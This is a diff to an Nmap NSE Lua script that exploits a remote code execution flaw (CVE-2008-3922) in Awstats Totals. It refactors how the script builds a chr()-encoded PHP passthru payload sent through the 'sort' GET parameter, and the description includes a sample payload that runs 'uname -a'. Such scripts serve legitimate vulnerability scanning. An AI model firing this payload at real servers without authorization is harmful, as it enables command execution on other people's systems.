@@ -4,11 +4,16 @@ local nmap = require "nmap"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
+local table = require "table"
 
 description = [[
-Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14 and possibly other products based on it (CVE: 2008-3922).
+Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14
+and possibly other products based on it (CVE: 2008-3922).
 
-This vulnerability can be exploited through the GET variable sort. The script queries the web server with the command payload encoded using PHP's chr() function:
+This vulnerability can be exploited through the GET variable <code>sort</code>.
+The script queries the web server with the command payload encoded using PHP's
+chr() function:
+
 <code>?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}</code>
 
 Common paths for Awstats Total:
@@ -41,7 +46,7 @@ References:
 --
 
 author = "Paulino Calderon <calderon@websec.mx>"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"vuln", "intrusive", "exploit"}
 
 
@@ -94,17 +99,14 @@ action = function(host, port)
   --check for awstats signature
   local awstats_check = check_installation(host, port, uri)
   if not(awstats_check) then
-    stdnse.print_debug(1, "%s:This does not look like Awstats Totals. Quitting.", SCRIPT_NAME)
+    stdnse.debug1("This does not look like Awstats Totals. Quitting.")
     return
   end
 
   --Encode payload using PHP's chr()
-  local encoded_payload = ""
-  cmd:gsub(".", function(c) encoded_payload = encoded_payload .."chr("..string.byte(c)..")." end)
-  if string.sub(encoded_payload, #encoded_payload) == "." then
-    encoded_payload = string.sub(encoded_payload, 1, #encoded_payload-1)
-  end
-  local stealth_payload = "?sort={%24{passthru%28"..encoded_payload.."%29}}{%24{exit%28%29}}"
+  local encoded_payload = {}
+  cmd:gsub(".", function(c) encoded_payload[#encoded_payload+1] = ("chr(%s)"):format(string.byte(c)) end)
+  local stealth_payload = "?sort={%24{passthru%28"..table.concat(encoded_payload,'.').."%29}}{%24{exit%28%29}}"
 
   --set payload and send request
   local req = http.get(host, port, uri .. stealth_payload)
